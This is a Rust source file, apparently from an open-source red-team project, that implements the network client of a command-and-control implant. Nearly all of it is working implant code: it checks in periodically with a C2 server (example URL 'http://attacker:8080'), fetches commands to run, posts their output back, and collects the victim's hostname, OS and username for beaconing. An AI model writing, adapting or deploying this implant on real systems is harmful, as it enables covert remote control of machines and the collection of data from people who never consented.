/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/ARaChn3/remy
//
// Copyright: MIT License
// See the LICENSE file for more info.
*/

//! HTTP client for implant-to-C2 communication.
//!
//! Handles all network communication with the C2 server:
//! - Periodic check-ins
//! - Command retrieval
//! - Result submission

use reqwest::Client;
use std::time::Duration;

use crate::shared::{CheckinRequest, CheckinResponse, CommandResult, ImplantInfo};

/// HTTP client wrapper for C2 communication.
///
/// Encapsulates all the logic for talking to the C2 server.
/// Handles serialization, error handling, and retries.
pub struct ImplantClient {
    /// The HTTP client
    client: Client,

    /// Base URL of the C2 server
    c2_url: String,

    /// Our implant information
    info: ImplantInfo,
}

impl ImplantClient {
    /// Creates a new implant client.
    ///
    /// # Arguments
    /// * `c2_url` - Base URL of the C2 server (e.g., "http://attacker:8080")
    /// * `info` - Information about this implant
    pub fn new(c2_url: String, info: ImplantInfo) -> Self {
        let client = Client::builder()
            .timeout(Duration::from_secs(30))
            .build()
            .expect("Failed to create HTTP client");

        Self {
            client,
            c2_url,
            info,
        }
    }

    /// Checks in with the C2 server.
    ///
    /// Sends our implant info and receives any pending commands.
    /// This should be called periodically (every sleep_interval seconds).
    ///
    /// # Returns
    /// CheckinResponse containing commands to execute and next sleep interval
    pub async fn checkin(&self) -> Result<CheckinResponse, reqwest::Error> {
        let url = format!("{}/api/checkin", self.c2_url);

        let request = CheckinRequest {
            info: self.info.clone(),
        };

        let response = self
            .client
            .post(&url)
            .json(&request)
            .send()
            .await?
            .json::<CheckinResponse>()
            .await?;

        Ok(response)
    }

    /// Sends a command result back to the C2 server.
    ///
    /// Called after executing a command to report the output.
    ///
    /// # Arguments
    /// * `result` - The command execution result
    pub async fn send_result(&self, result: CommandResult) -> Result<(), reqwest::Error> {
        let url = format!("{}/api/result", self.c2_url);

        self.client.post(&url).json(&result).send().await?;

        Ok(())
    }
}

/// Collects information about the current system.
///
/// Used to populate the ImplantInfo struct on startup.
pub fn gather_system_info(implant_id: String) -> ImplantInfo {
    use chrono::Utc;
    use std::env;

    let hostname = hostname::get()
        .map(|h| h.to_string_lossy().to_string())
        .unwrap_or_else(|_| "unknown".to_string());

    let os = format!("{} {}", env::consts::OS, env::consts::ARCH);

    let username = env::var("USER")
        .or_else(|_| env::var("USERNAME"))
        .unwrap_or_else(|_| "unknown".to_string());

    // Get local IP - this is a simplification
    // Real implementation would enumerate network interfaces
    let ip = "0.0.0.0".to_string();

    let now = Utc::now();

    ImplantInfo {
        id: implant_id,
        hostname,
        os,
        username,
        ip,
        first_seen: now,
        last_seen: now,
    }
}
